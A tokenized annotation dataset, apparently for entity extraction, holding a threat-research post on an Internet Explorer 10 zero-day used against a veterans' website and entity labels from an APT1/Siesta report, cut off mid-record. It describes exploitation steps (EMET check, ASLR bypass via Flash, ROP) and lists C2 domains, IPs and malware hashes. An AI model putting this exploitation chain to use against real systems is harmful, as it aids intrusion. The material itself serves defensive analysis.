["Vulnerability", "analysis"], ["The", "vulnerability", "is", "a", "previously", "unknown", "use", "-", "after", "-", "free", "bug", "in", "Microsoft", "Internet", "Explorer", "10", "."], ["The", "vulnerability", "allows", "the", "attacker", "to", "modify", "one", "byte", "of", "memory", "at", "an", "arbitrary", "address", "."], ["The", "attacker", "uses", "the", "vulnerability", "to", "do", "the", "following", ":"], ["Gain", "access", "to", "memory", "from", "Flash", "ActionScript", ",", "bypassing", "address", "space", "layout", "randomization", "(", "ASLR", ")"], ["Pivot", "to", "a", "return", "-", "oriented", "programing", "(", "ROP", ")", "exploit", "technique", "to", "bypass", "data", "execution", "prevention", "(", "DEP", ")"], ["EMET", "detection"], ["The", "attacker", "uses", "the", "Microsoft", ".", "XMLDOM", "ActiveX", "control", "to", "load", "a", "one", "-", "line", "XML", "string", "containing", "a", "file", "path", "to", "the", "EMET", "DLL", "."], ["Then", "the", "exploit", "code", "parses", "the", "error", "resulting", "from", "the", "XML", "load", "order", "to", "determine", "whether", "the", "load", "failed", "because", "the", "EMET", "DLL", "is", "not", "present", "."], ["The", "exploit", "proceeds", "only", "if", "this", "check", "determines", "that", "the", "EMET", "DLL", "is", "not", "present", "."], ["ASLR", "bypass"], ["Because", "the", "vulnerability", "allows", "attackers", "to", "modify", "memory", "to", "an", "arbitrary", "address", ",", "the", "attacker", "can", "use", "it", "to", "bypass", "ASLR", "."], ["For", "example", ",", "the", "attacker", "corrupts", "a", "Flash", "Vector", "object", "and", "then", "accesses", "the", "corrupted", "object", "from", "within", "Flash", "to", "access", "memory", "."], ["We", "have", "discussed", "this", "technique", "and", "other", "ASLR", "bypass", "approaches", "in", "our", "blog", "."], ["One", "minor", "difference", "between", "the", "previous", "approaches", "and", "this", "attack", "is", "the", "heap", "spray", "address", ",", "which", "was", "changed", "to", "0x1a1b2000", "in", "this", "exploit", "."], ["Code", "execution"], ["Once", "the", "attacker", "\u2019s", "code", "has", "full", "memory", "access", "through", "the", "corrupted", "Flash", "Vector", "object", ",", "the", "code", "searches", "through", "loaded", "libraries", "gadgets", "by", "machine", "code", "."], ["The", "attacker", "then", "overwrites", "the", "vftable", "pointer", "of", "a", "flash", "."], ["Media", "."], ["Sound", "(", ")", "object", "in", "memory", "to", "point", "to", "the", "pivot", "and", "begin", "ROP", "."], ["After", "successful", "exploitation", ",", "the", "code", "repairs", "the", "corrupted", "Flash", "Vector", "and", "flash", "."], ["Media", "."], ["Sound", "to", "continue", "execution", "."], ["Shellcode", "analysis"], ["Subsequently", ",", "the", "malicious", "Flash", "code", "downloads", "a", "file", "containing", "the", "dropped", "malware", "payload", "."], ["The", "beginning", "of", "the", "file", "is", "a", "JPG", "image", ";", "the", "end", "of", "the", "file", "(", "offset", "36321", ")", "is", "the", "payload", ",", "encoded", "with", "an", "XOR", "key", "of", "0\u00d795", "."], ["The", "attacker", "appends", "the", "payload", "to", "the", "shellcode", "before", "pivoting", "to", "code", "control", "."], ["Then", ",", "when", "the", "shellcode", "is", "executed", ",", "the", "malware", "creates", "files", "\u201c", "sqlrenew.txt", "\u201d", "and", "\u201c", "stream.exe", "\u201d", "."], ["The", "tail", "of", "the", "image", "file", "is", "decoded", ",", "and", "written", "to", "these", "files", "."], ["\u201c", "sqlrenew.txt", "\u201d", "is", "then", "executed", "with", "the", "LoadLibraryA", "Windows", "API", "call", "."], ["ZxShell", "payload", "analysis"], ["As", "documented", "above", ",", "this", "exploit", "dropped", "an", "XOR", "(", "0\u00d795", ")", "payload", "that", "executed", "a", "ZxShell", "backdoor", "(", "MD5", ":", "8455bbb9a210ce603a1b646b0d951bce", ")", "."], ["The", "compile", "date", "of", "the", "payload", "was", "2014", "-", "02", "-", "11", ",", "and", "the", "last", "modified", "date", "of", "the", "exploit", "code", "was", "also", "2014", "-", "02", "-", "11", "."], ["This", "suggests", "that", "this", "instantiation", "of", "the", "exploit", "was", "very", "recent", "and", "was", "deployed", "for", "this", "specific", "strategic", "Web", "compromise", "of", "the", "Veterans", "of", "Foreign", "Wars", "website", "."], ["A", "possible", "objective", "in", "the", "SnowMan", "attack", "is", "targeting", "military", "service", "members", "to", "steal", "military", "intelligence", "."], ["In", "addition", "to", "retirees", ",", "active", "military", "personnel", "use", "the", "VFW", "website", "."], ["It", "is", "probably", "no", "coincidence", "that", "Monday", ",", "Feb.", "17", ",", "is", "a", "U.S.", "holiday", ",", "and", "much", "of", "the", "U.S.", "Capitol", "shut", "down", "Thursday", "amid", "a", "severe", "winter", "storm", "."], ["The", "ZxShell", "backdoor", "is", "a", "widely", "used", "and", "publicly", "available", "tool", "used", "by", "multiple", "threat", "actors", "linked", "to", "cyber", "espionage", "operations", "."], ["This", "particular", "variant", "called", "back", "to", "a", "command", "and", "control", "server", "located", "at", "newss[.]effers[.]com", "."], ["This", "domain", "currently", "resolves", "to", "118.99.60.142", "."], ["The", "domain", "info[.]flnet[.]org", "also", "resolved", "to", "this", "IP", "address", "on", "2014", "-", "02", "-", "12", "."], ["Infrastructure", "analysis"], ["The", "info[.]flnet[.]org", "domain", "overlaps", "with", "icybin[.]flnet[.]org", "and", "book[.]flnet[.]org", "via", "the", "previous", "resolutions", "to", "the", "following", "IP", "addresses", ":", "58.64.200.178"], ["58.64.200.179", "103.20.192.4"], ["First", "Seen", "2013", "-", "08", "-", "31", "2013", "-", "05", "-", "02", "2013", "-", "08", "-", "02", "2013", "-", "08", "-", "10", "2013", "-", "07", "-", "15", "2014", "-", "01", "-", "02", "2013", "-", "12", "-", "03", "Last", "Seen", "2013", "-", "08", "-", "31", "2013", "-", "08", "-", "02", "2013", "-", "08", "-", "02", "2013", "-", "08", "-", "10", "2013", "-", "07", "-", "15", "2014", "-", "01", "-", "02", "2014", "-", "01", "-", "02", "CnC", "Domain", "icybin.flnet[.]org", "info.flnet[.]org"], ["book.flnet[.]org", "info.flnet[.]org", "icybin.flnet[.]org", "book.flnet[.]org", "info.flnet[.]org"], ["IP", "58.64.200.178"], ["58.64.200.178"], ["58.64.200.178"], ["58.64.200.179", "58.64.200.179", "103.20.192.4", "103.20.192.4", "We", "previously", "observed", "Gh0stRat", "samples", "with", "the", "custom", "packet", "flag", "\u201c", "HTTPS", "\u201d", "calling", "back", "to", "book[.]flnet[.]org", "and", "icybin[.]flnet[.]org", "."], ["The", "threat", "actor", "responsible", "for", "Operation", "DeputyDog", "also", "used", "the", "\u201c", "HTTPS", "\u201d", "version", "of", "the", "Gh0st", "."], ["We", "also", "observed", "another", "\u201c", "HTTPS", "\u201d", "Gh0st", "variant", "connecting", "to", "a", "related", "command", "and", "control", "server", "at", "me[.]scieron[.]com", "."], ["MD5", "Hash", "CnC", "Domain", "758886e58f9ea2ff22b57cbbb015166e", "book.flnet[.]org", "0294f9280491f85d898ebe471f0fb58e", "icybin.flnet[.]org", "9d20566a327076b7152bbf9ed20292c4", "me.scieron[.]com"], ["The", "me[.]scieron[.]com", "domain", "previously", "resolved", "to", "58.64.199.22", "."], ["The", "book[.]flnet[.]org", "domain", "also", "resolved", "to", "another", "IP", "in", "the", "same", "subnet", "58.64.199.0/24", "."], ["Specifically", ",", "book[.]flnet[.]org", "previously", "resolved", "to", "58.64.199.27", "."], ["Others", "domain", "seen", "resolving", "to", "this", "same", "/24", "subnet", "were", "dll[.]freshdns[.]org", ",", "ali[.]blankchair[.]com", ",", "and", "cht[.]blankchair[.]com", "."], ["The", "domain", "dll[.]freshdns[.]org", "resolved", "to", "58.64.199.25", "."], ["Both"], ["ali[.]blankchair[.]com", "and", "cht[.]blankchair[.]com", "resolved", "to", "58.64.199.22", "."], ["First", "Seen", "Last", "Seen", "CnC", "Domain", "IP", "2012", "-", "11", "-", "12", "2012", "-", "04", "-", "09", "2012", "-", "04", "-", "09"], ["2012", "-", "11", "-", "08", "2012", "-", "11", "-", "23", "2012", "-", "05", "-", "29", "2012", "-", "11", "-", "28", "2012", "-", "10", "-", "24", "2012", "-", "09", "-", "18", "2012", "-", "11", "-", "25", "2012", "-", "11", "-", "27", "2012", "-", "6", "-", "28", "me.scieron[.]com"], ["58.64.199.22"], ["cht.blankchair[.]com", "58.64.199.22", "ali.blankchair[.]com"], ["58.64.199.22", "dll.freshdns[.]org"], ["58.64.199.25"], ["rt.blankchair[.]com", "58.64.199.25", "book.flnet[.]org"], ["58.64.199.27"], ["A", "number", "of", "other", "related", "domains", "resolve", "to", "these", "IPs", "and", "other", "IPs", "also", "in", "this", "/24", "subnet", "."], ["For", "the", "purposes", "of", "this", "blog", ",", "we", "\u2019ve", "chosen", "to", "focus", "on", "those", "domains", "and", "IP", "that", "relate", "to", "the", "previously", "discussed", "DeputyDog", "and", "Ephemeral", "Hydra", "campaigns", "."], ["You", "may", "recall", "that", "dll[.]freshdns[.]org", ",", "ali[.]blankchair[.]com", "and", "cht[.]blankchair[.]com", "were", "all", "linked", "to", "both", "Operation", "DeputyDog", "and", "Operation", "Ephemeral", "Hydra", "."], ["Figure", "1", "illustrates", "the", "infrastructure", "overlaps", "and", "connections", "we", "observed", "between", "the", "strategic", "Web", "compromise", "campaign", "leveraging", "the", "VFW", "\u2019s", "website", ",", "the", "DeputyDog", ",", "and", "the", "Ephemeral", "Hydra", "operations", "."], ["Figure", "1", ":", "Ties", "between", "Operation", "SnowMan", ",", "DeputyDog", ",", "and", "Ephemeral", "Hydra", "Links", "to", "DeputyDog", "and", "Ephemeral", "Hydra"], ["Other", "tradecraft", "similarities", "between", "the", "actor(s", ")", "responsible", "for", "this", "campaign", "and", "the", "actor(s", ")", "responsible", "for", "the", "DeputyDog", "/", "Ephemeral", "Hydra", "campaigns", "include", ":"], ["The", "use", "of", "zero", "-", "day", "exploits", "to", "deliver", "a", "remote", "access", "Trojan", "(", "RAT", ")"], ["The", "use", "of", "strategic", "web", "compromise", "as", "a", "vector", "to", "distribute", "remote", "access", "Trojans"], ["The", "use", "of", "a", "simple", "single", "-", "byte", "XOR", "encoded", "(", "0\u00d795", ")", "payload", "obfuscated", "with", "a", ".jpg", "extension"], ["The", "use", "of", "Gh0stRat", "with", "the", "\u201c", "HTTPS", "\u201d", "packet", "flag"], ["The", "use", "of", "related", "command", "-", "and", "-", "control", "(", "CnC", ")", "infrastructure", "during", "the", "similar", "time", "frames"], ["We", "observed", "many", "similarities", "from", "the", "exploitation", "side", "as", "well", "."], ["At", "a", "high", "level", ",", "this", "attack", "and", "the", "CVE2013", "-", "3163", "attack", "both", "leveraged", "a", "Flash", "file", "that", "orchestrated", "the", "exploit", ",", "and", "would", "call", "back", "into", "IE", "JavaScript", "to", "trigger", "an", "IE", "flaw", "."], ["The", "code", "within", "the", "Flash", "files", "from", "each", "attack", "are", "extremely", "similar", "."], ["They", "build", "ROP", "chains", "and", "shellcode", "the", "same", "way", ",", "both", "choose", "to", "corrupt", "a", "Flash", "Vector", "object", ",", "have", "some", "identical", "functions", "with", "common", "typos", ",", "and", "even", "share", "the", "same", "name", "."], ["Conclusion"], ["These", "actors", "have", "previously", "targeted", "a", "number", "of", "different", "industries", ",", "including", ":", "U.S.", "government", "entities", "Japanese", "firms", "Defense", "industrial", "base", "(", "DIB", ")", "companies"], ["Law", "firms", "Information", "technology", "(", "IT", ")", "companies"], ["Mining", "companies"], ["Non", "-", "governmental", "organizations", "(", "NGOs", ")"], ["The", "proven", "ability", "to", "successfully", "deploy", "a", "number", "of", "different", "private", "and", "public", "RATs", "using", "zero", "-", "day", "exploits", "against", "high", "-", "profile", "targets", "likely", "indicates", "that", "this", "actor(s", ")", "will", "continue", "to", "operate", "in", "the", "mid", "to", "long", "-", "term", "."], ["This", "entry", "was", "posted", "in", "Advanced", "Malware", ",", "Exploits", ",", "Targeted", "Attack", ",", "Threat", "Research", ",", "Vulnerabilities", "and", "tagged", "0day", ",", "zero", "-", "day", "by", "Darien", "Kindlund", ",", "Dan", "Caselden", ",", "Xiaobo", "Chen", ",", "Ned", "Moran", "and", "Mike", "Scott", "."], ["Bookmark", "the", "permalink", "."]]}, {"vertexSet": [[{"name": "Siesta", "pos": [45, 46], "sent_id": 0, "type": "Campaign"}], [{"name": "FireEye", "pos": [13, 14], "sent_id": 1, "type": "Organization"}], [{"name": "TrendMicro", "pos": [22, 23], "sent_id": 1, "type": "Organization"}], [{"name": "Siesta", "pos": [29, 30], "sent_id": 1, "type": "Campaign"}], [{"name": "Siesta", "pos": [1, 2], "sent_id": 3, "type": "Campaign"}], [{"name": "March 6, 2014", "pos": [1, 5], "sent_id": 5, "type": "Time"}], [{"name": "TrendMicro", "pos": [5, 6], "sent_id": 5, "type": "Organization"}], [{"name": "Siesta", "pos": [9, 10], "sent_id": 5, "type": "Campaign"}], [{"name": "APT1", "pos": [33, 34], "sent_id": 6, "type": "Attacker"}], [{"name": "Comment Crew", "pos": [40, 42], "sent_id": 6, "type": "Attacker"}], [{"name": "Feb. 20, 2014", "pos": [13, 17], "sent_id": 7, "type": "Time"}], [{"name": "ifuedit[.]net/Healthcare_Questionnaire.zip", "pos": [36, 39], "sent_id": 7, "type": "Dropper"}], [{"name": "61249bf64fa270931570b8a5eba06afa", "pos": [14, 15], "sent_id": 8, "type": "MD5"}], [{"name": "2014-02-20 02:28:21", "pos": [17, 23], "sent_id": 8, "type": "Time"}], [{"name": "39e9e4eac77a09b915626f315b963a4f", "pos": [24, 25], "sent_id": 8, "type": "MD5"}], [{"name": "a126c8c7c50bf034f2d3ba4aa5bcab28", "pos": [26, 27], "sent_id": 8, "type": "MD5"}], [{"name": "bb95154b5aeb13a4ff937afa2e7e4560", "pos": [28, 29], "sent_id": 8, "type": "MD5"}], [{"name": "edf3a1e142fc212da11dc72698184ad5", "pos": [30, 31], "sent_id": 8, "type": "MD5"}], [{"name": "20ff5087740eabff5bdbdf99d9fb6853", "pos": [33, 34], "sent_id": 8, "type": "MD5"}], [{"name": "www[.]microsofthomes[.]com/index.html", "pos": [6, 9], "sent_id": 9, "type": "Indicator"}], [{"name": "68f73d81c814ab2f70eed02c0be3b67d", "pos": [24, 25], "sent_id": 10, "type": "MD5"}], [{"name": "2014-02-20 02:26:24", "pos": [25, 31], "sent_id": 10, "type": "Time"}], [{"name": "www[.]microsofthomes[.]com", "pos": [0, 1], "sent_id": 11, "type": "Indicator"}], [{"name": "20b124baaaec1e8cbc3cd52e8e5ceebd", "pos": [1, 2], "sent_id": 11, "type": "MD5"}], [{"name": "2014-02-20 02:26:24", "pos": [2, 8], "sent_id": 11, "type": "Time"}], [{"name": "www[.]microsofthomes[.]com", "pos": [8, 9], "sent_id": 11, "type": "Indicator"}], [{"name": "APT1", "pos": [7, 8], "sent_id": 12, "type": "Attacker"}], [{"name": "Spear-phishing emails", "pos": [15, 19], "sent_id": 13, "type": "Exploit"}], [{"name": "dropper", "pos": [2, 3], "sent_id": 14, "type": "Dropper"}], [{"name": "TrendMicro", "pos": [6, 7], "sent_id": 14, "type": "Organization"}], [{"name": "Siesta", "pos": [10, 11], "sent_id": 14, "type": "Campaign"}], [{"name": "0f3031412d255336a102bbc1dcd43812", "pos": [14, 15], "sent_id": 14, "type": "MD5"}], [{"name": "0f3031412d255336a102bbc1dcd43812", "pos": [9, 10], "sent_id": 15, "type": "MD5"}], [{"name": "2014-02-19 09:29:04", "pos": [12, 18], "sent_id": 15, "type": "Time"}], [{"name": "a2e11e9c8b07888345d6cdf7d995b832", "pos": [19, 20], "sent_id": 15, "type": "MD5"}], [{"name": "0203cc3bb607e9cfa296fa857b243468", "pos": [21, 22], "sent_id": 15, "type": "MD5"}], [{"name": "7d281bd27bc1279428bd1798671eb57b", "pos": [23, 24], "sent_id": 15, "type": "MD5"}], [{"name": "caa869fa01ddfee26156166a10c42944", "pos": [25, 26], "sent_id": 15, "type": "MD5"}], [{"name": "0fefba40443edd57f816502035077e3e", "pos": [2, 3], "sent_id": 16, "type": "MD5"}], [{"name": "0fefba40443edd57f816502035077e3e", "pos": [4, 5], "sent_id": 17, "type": "MD5"}], [{"name": "samples", "pos": [8, 9], "sent_id": 17, "type": "Malware"}], [{"name": "643654975b63a9bb6f597502e5cd8f49", "pos": [18, 19], "sent_id": 17, "type": "MD5"}], [{"name": "2014-01-14 04:38:30", "pos": [28, 34], "sent_id": 17, "type": "Time"}], [{"name": "www[.]cloudcominc[.]com", "pos": [35, 36], "sent_id": 17, "type": "Indicator"}], [{"name": "643654975b63a9bb6f597502e5cd8f49", "pos": [36, 37], "sent_id": 17, "type": "MD5"}], [{"name": "2014-01-14 04:38:30", "pos": [37, 43], "sent_id": 17, "type": "Time"}], [{"name": "www[.]cloudcominc[.]com", "pos": [43, 44], "sent_id": 17, "type": "Indicator"}], [{"name": "0f3031412d255336a102bbc1dcd43812", "pos": [44, 45], "sent_id": 17, "type": "MD5"}], [{"name": "2014-02-19 09:29:04", "pos": [45, 51], "sent_id": 17, "type": "Time"}], [{"name": "www[.]skyslisten[.]com", "pos": [51, 52], "sent_id": 17, "type": "Indicator"}], [{"name": "APT1", "pos": [66, 67], "sent_id": 17, "type": "Attacker"}], [{"name": "2011", "pos": [73, 74], "sent_id": 17, "type": "Time"}], [{"name": "APT1", "pos": [81, 82], "sent_id": 17, "type": "Attacker"}], [{"name": "samples", "pos": [2, 3], "sent_id": 19, "type": "Malware"}], [{"name": "719453b4da6d3814604c84a28d4d1f4c", "pos": [21, 22], "sent_id": 19, "type": "MD5"}], [{"name": "2011-06-16 12:54:20", "pos": [22, 28], "sent_id": 19, "type": "Time"}], [{"name": "www[.]stapharrest[.]com", "pos": [28, 29], "sent_id": 19, "type": "Indicator"}], [{"name": "93a6e9a26924a5cdab8ed47cadbe88d5", "pos": [29, 30], "sent_id": 19, "type": "MD5"}], [{"name": "2012-01-18 13:35:54", "pos": [30, 36], "sent_id": 19, "type": "Time"}], [{"name": "www[.]offerdahls[.]com", "pos": [36, 37], "sent_id": 19, "type": "Indicator"}], [{"name": "c2aadd6a69a775602d984af64eaeda96", "pos": [37, 38], "sent_id": 19, "type": "MD5"}], [{"name": "2012-05-15 09:02:25", "pos": [38, 44], "sent_id": 19, "type": "Time"}], [{"name": "www[.]bluecoate[.]com", "pos": [0, 1], "sent_id": 20, "type": "Indicator"}], [{"name": "1df0b937239473df0187063392dae028", "pos": [1, 2], "sent_id": 20, "type": "MD5"}], [{"name": "2012-06-20 09:25:31", "pos": [2, 8], "sent_id": 20, "type": "Time"}], [{"name": "www[.]billyjoebobshow[.]com", "pos": [8, 9], "sent_id": 20, "type": "Indicator"}], [{"name": "55065f1b341e5b095b6d453923d5654d", "pos": [9, 10], "sent_id": 20, "type": "MD5"}], [{"name": "2012-07-12 09:21:17", "pos": [10, 16], "sent_id": 20, "type": "Time"}], [{"name": "184.82.164.104", "pos": [16, 17], "sent_id": 20, "type": "Address"}], [{"name": "65502e91e3676cf30778a7078f1061de", "pos": [17, 18], "sent_id": 20, "type": "MD5"}], [{"name": "2012-07-19 09:31:42", "pos": [18, 24], "sent_id": 20, "type": "Time"}], [{"name": "www[.]billyjoebobshow[.]com", "pos": [24, 25], "sent_id": 20, "type": "Indicator"}], [{"name": "287113e4423813efd242af8e6255f680", "pos": [25, 26], "sent_id": 20, "type": "MD5"}], [{"name": "2012-07-24 05:53:22", "pos": [26, 32], "sent_id": 20, "type": "Time"}], [{"name": "thales[.]myftp[.]info", "pos": [32, 33], "sent_id": 20, "type": "Indicator"}], [{"name": "d613d40d5402f58d8952da2c24d1a769", "pos": [33, 34], "sent_id": 20, "type": "MD5"}], [{"name": "2012-09-27 12:46:20", "pos": [34, 40], "sent_id": 20, "type": "Time"}], [{"name": "57a4c6236b4ecf96d31258e5cc6f0ae4", "pos": [42, 43], "sent_id": 20, "type": "MD5"}], [{"name": "2013-01-07 07:43:14", "pos": [43, 49], "sent_id": 20, "type": "Time"}], [{"name": "manslist[.]loopback[.]nu", "pos": [49, 50], "sent_id": 20, "type": "Indicator"}], [{"name": "e5a4ec0519c471b5be093aee5c33b1ee", "pos": [50, 51], "sent_id": 20, "type": "MD5"}], [{"name": "2013-01-08 07:34:59", "pos": [51, 57], "sent_id": 20, "type": "Time"}], [{"name": "www[.]whackcard[.]com", "pos": [57, 58], "sent_id": 20, "type": "Indicator"}], [{"name": "f822a9e08b51c19a154dfb63ee9b8367", "pos": [65, 66], "sent_id": 20, "type": "MD5"}], [{"name": "2013-01-10 07:50:58", "pos": [66, 72], "sent_id": 20, "type": "Time"}], [{"name": "technology[.]acmetoy[.]com", "pos": [0, 1], "sent_id": 21, "type": "Indicator"}], [{"name": "0f3031412d255336a102bbc1dcd43812", "pos": [4, 5], "sent_id": 21, "type": "MD5"}], [{"name": "185e930a19ad1a99c226d59ef563e28c", "pos": [13, 14], "sent_id": 21, "type": "MD5"}], [{"name": "dropper", "pos": [9, 10], "sent_id": 22, "type": "Dropper"}], [{"name": "APT1 samples", "pos": [9, 11], "sent_id": 24, "type": "Malware"}], [{"name": "736ebc9b8ece410aaf4e8b60615f065f", "pos": [23, 24], "sent_id": 24, "type": "MD5"}], [{"name": "2003-05-15 08:58:48", "pos": [24, 30], "sent_id": 24, "type": "Time"}], [{"name": "www[.]comtoway[.]com", "pos": [30, 31], "sent_id": 24, "type": "Indicator"}], [{"name": "ac87816b9a371e72512d8fd82f61c737", "pos": [31, 32], "sent_id": 24, "type": "MD5"}], [{"name": "2006-09-14 02:28:46", "pos": [32, 38], "sent_id": 24, "type": "Time"}], [{"name": "www[.]mwa[.]net", "pos": [38, 39], "sent_id": 24, "type": "Indicator"}], [{"name": "173cd315008897e56fa812f2b2843f83", "pos": [39, 40], "sent_id": 24, "type": "MD5"}], [{"name": "2006-09-14 02:28:46", "pos": [40, 46], "sent_id": 24, "type": "Time"}], [{"name": "www[.]deebeedesigns[.]ca", "pos": [46, 47], "sent_id": 24, "type": "Indicator"}], [{"name": "513644c57688b70860d0b9aa1b6cd0d7", "pos": [47, 48], "sent_id": 24, "type": "MD5"}], [{"name": "2010-12-17 03:24:13", "pos": [48, 54], "sent_id": 24, "type": "Time"}], [{"name": "69.90.65.240", "pos": [54, 55], "sent_id": 24, "type": "Address"}], [{"name": "fdf6bf1973af8ab130fbcaa0914b4b06", "pos": [55, 56], "sent_id": 24, "type": "MD5"}], [{"name": "2012-05-10 08:41:35", "pos": [56, 62], "sent_id": 24, "type": "Time"}], [{"name": "www[.]woodagency[.]com", "pos": [62, 63], "sent_id": 24, "type": "Indicator"}], [{"name": "682bfed6332e210b4f3a91e5e8a1410b", "pos": [63, 64], "sent_id": 24, "type": "MD5"}], [{"name": "2012-05-15 03:17:04", "pos": [64, 70], "sent_id": 24, "type": "Time"}], [{"name": "www[.]oewarehouse[.]com", "pos": [0, 1], "sent_id": 25, "type": "Indicator"}], [{"name": "fb7a74a88eead4d39a58cc7b6eede4ce", "pos": [1, 2], "sent_id": 25, "type": "MD5"}], [{"name": "2013-08-01 18:23:07", "pos": [2, 8], "sent_id": 25, "type": "Time"}], [{"name": "www[.]mwa[.]net", "pos": [8, 9], "sent_id": 25, "type": "Indicator"}], [{"name": "719453b4da6d3814604c84a28d4d1f4c", "pos": [35, 36], "sent_id": 25, "type": "MD5"}], [{"name": "2011-06-16 12:54:20", "pos": [36, 42], "sent_id": 25, "type": "Time"}], [{"name": "www[.]drgeorges[.]com", "pos": [42, 43], "sent_id": 25, "type": "Indicator"}], [{"name": "854cb8ba3b2d3058239a7ba6a427944a", "pos": [43, 44], "sent_id": 25, "type": "MD5"}], [{"name": "2011-08-17 00:31:27", "pos": [44, 50], "sent_id": 25, "type": "Time"}], [{"name": "meeting[.]toh[.]info", "pos": [50, 51], "sent_id": 25, "type": "Indicator"}], [{"name": "a049b8ec51c0255dec734c7ba5641af3", "pos": [51, 52], "sent_id": 25, "type": "MD5"}], [{"name": "2011-08-17 00:31:27", "pos": [52, 58], "sent_id": 25, "type": "Time"}], [{"name": "meeting[.]toh[.]info", "pos": [58, 59], "sent_id": 25, "type": "Indicator"}], [{"name": "0725a1819a58e988b939f06e53990254", "pos": [59, 60], "sent_id": 25, "type": "MD5"}], [{"name": "2011-08-17 00:31:27", "pos": [60, 66], "sent_id": 25, "type": "Time"}], [{"name": "google.ninth.biz", "pos": [66, 67], "sent_id": 25, "type": "Indicator"}], [{"name": "0fdffd4f5730bdd37f2f082bf396064a", "pos": [67, 68], "sent_id": 25, "type": "MD5"}], [{"name": "2011-08-11 09:35:24", "pos": [68, 74], "sent_id": 25, "type": "Time"}], [{"name": "homepage[.]longmusic[.]com", "pos": [0, 1], "sent_id": 26, "type": "Indicator"}], [{"name": "e476e4a24f8b4ff4c8a0b260aa35fc9f", "pos": [1, 2], "sent_id": 26, "type": "MD5"}], [{"name": "2012-06-09 13:19:49", "pos": [2, 8], "sent_id": 26, "type": "Time"}], [{"name": "www[.]heliospartners[.]com", "pos": [8, 9], "sent_id": 26, "type": "Indicator"}], [{"name": "d613d40d5402f58d8952da2c24d1a769", "pos": [9, 10], "sent_id": 26, "type": "MD5"}], [{"name": "2012-09-27 12:46:20", "pos": [10, 16], "sent_id": 26, "type": "Time"}], [{"name": "www[.]billyjoebobshow[.]com", "pos": [16, 17], "sent_id": 26, "type": "Indicator"}], [{"name": "f822a9e08b51c19a154dfb63ee9b8367", "pos": [17, 18], "sent_id": 26, "type": "MD5"}], [{"name": "2013-01-10 07:50:58", "pos": [18, 24], "sent_id": 26, "type": "Time"}], [{"name": "technology[.]acmetoy[.]com", "pos": [0, 1], "sent_id": 27, "type": "Indicator"}], [{"name": "61249bf64fa270931570b8a5eba06afa", "pos": [2, 3], "sent_id": 27, "type": "MD5"}], [{"name": "0f3031412d255336a102bbc1dcd43812", "pos": [4, 5], "sent_id": 27, "type": "MD5"}], [{"name": "fb080cef60846528c409f60400f334100a16a5bd77b953c864b23a945fcf26fd", "pos": [19, 20], "sent_id": 27, "type": "SHA-256"}], [{"name": "APT1 samples", "pos": [1, 3], "sent_id": 29, "type": "Malware"}], [{"name": "1aab2040ed4f918e1823e2caf645a81d", "pos": [18, 19], "sent_id": 29, "type": "MD5"}], [{"name": "8ee2cf05746bb0a009981fdb90f1343e", "pos": [19, 20], "sent_id": 29, "type": "MD5"}], [{"name": "2009-09-28 22:08:38", "pos": [30, 36], "sent_id": 29, "type": "Time"}], [{"name": "www[.]olmusic100[.]com", "pos": [36, 37], "sent_id": 29, "type": "Indicator"}], [{"name": "2010-03-15", "pos": [37, 42], "sent_id": 29, "type": "Time"}], [{"name": "gogotrade[.]apple.org[.]ru", "pos": [42, 43], "sent_id": 29, "type": "Indicator"}], [{"name": "8ee2cf05746bb0a009981fdb90f1343e", "pos": [43, 44], "sent_id": 29, "type": "MD5"}], [{"name": "11:46:31", "pos": [44, 45], "sent_id": 29, "type": "Time"}], [{"name": "tradeproject[.]rlogin[.]org", "pos": [0, 1], "sent_id": 30, "type": "Indicator"}], [{"name": "9c4617793984c4b08d75b00f1562cbda", "pos": [1, 2], "sent_id": 30, "type": "MD5"}], [{"name": "2010-08-31 03:27:55", "pos": [2, 8], "sent_id": 30, "type": "Time"}], [{"name": "freetrade[.]allowed[.]org", "pos": [0, 1], "sent_id": 31, "type": "Indicator"}], [{"name": "worldwide[.]chickenkiller[.]com", "pos": [0, 1], "sent_id": 32, "type": "Indicator"}], [{"name": "b584b48d401e98f404584c330489895c", "pos": [1, 2], "sent_id": 32, "type": "MD5"}], [{"name": "2010-08-31 07:52:17", "pos": [2, 8], "sent_id": 32, "type": "Time"}], [{"name": "worldwide[.]chickenkiller[.]com", "pos": [0, 1], "sent_id": 33, "type": "Indicator"}], [{"name": "freetrade[.]allowed[.]org", "pos": [1, 2], "sent_id": 33, "type": "Indicator"}], [{"name": "b92a53fc409d175c768581978f1d3331", "pos": [2, 3], "sent_id": 33, "type": "MD5"}], [{"name": "2010-09-16 09:57:09", "pos": [3, 9], "sent_id": 33, "type": "Time"}], [{"name": "www[.]rbaparts[.]com", "pos": [9, 10], "sent_id": 33, "type": "Indicator"}], [{"name": "d6c19be4e9e1ae347ee269d15cb96a51", "pos": [10, 11], "sent_id": 33, "type": "MD5"}], [{"name": "d0a7cd5cd7da9024fb8bd594d37d7594", "pos": [11, 12], "sent_id": 33, "type": "MD5"}], [{"name": "b19ef1134f54b4021f99cc45ae1bc270", "pos": [0, 1], "sent_id": 34, "type": "MD5"}], [{"name": "b0a95c47d170baad8a5594e0f755e0c1", "pos": [1, 2], "sent_id": 34, "type": "MD5"}], [{"name": "894ef915af830f38499d498342fdd8db", "pos": [2, 3], "sent_id": 34, "type": "MD5"}], [{"name": "c2aadd6a69a775602d984af64eaeda96", "pos": [3, 4], "sent_id": 34, "type": "MD5"}], [{"name": "2010-10-25 01:59:00", "pos": [4, 10], "sent_id": 34, "type": "Time"}], [{"name": "2011-04-20 07:39:01", "pos": [0, 6], "sent_id": 35, "type": "Time"}], [{"name": "2011-06-13 06:56:04", "pos": [6, 12], "sent_id": 35, "type": "Time"}], [{"name": "2012-03-26 06:50:10", "pos": [12, 18], "sent_id": 35, "type": "Time"}], [{"name": "2012-03-26 07:13:36", "pos": [18, 24], "sent_id": 35, "type": "Time"}], [{"name": "2012-05-15 09:02:25", "pos": [24, 30], "sent_id": 35, "type": "Time"}], [{"name": "www[.]kayauto[.]net", "pos": [30, 31], "sent_id": 35, "type": "Indicator"}], [{"name": "www[.]kayauto[.]net", "pos": [31, 32], "sent_id": 35, "type": "Indicator"}], [{"name": "www[.]kayauto[.]net", "pos": [32, 33], "sent_id": 35, "type": "Indicator"}], [{"name": "www[.]coachmotor[.]com", "pos": [33, 34], "sent_id": 35, "type": "Indicator"}], [{"name": "www[.]rightnowautoparts[.]com", "pos": [34, 35], "sent_id": 35, "type": "Indicator"}], [{"name": "www[.]bluecoate[.]com", "pos": [35, 36], "sent_id": 35, "type": "Indicator"}], [{"name": "Menupass", "pos": [17, 18], "sent_id": 37, "type": 